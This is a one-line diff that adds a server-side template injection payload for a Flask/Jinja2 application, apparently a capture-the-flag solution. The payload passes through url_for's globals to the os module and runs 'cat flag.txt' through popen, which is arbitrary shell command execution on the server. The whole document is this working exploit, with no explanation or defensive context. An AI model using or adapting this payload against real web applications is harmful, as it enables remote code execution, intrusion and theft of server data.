@@ -1,0 +1,1 @@
+?q={{url_for.__globals__.os.__dict__.popen('cat flag.txt').read()}}
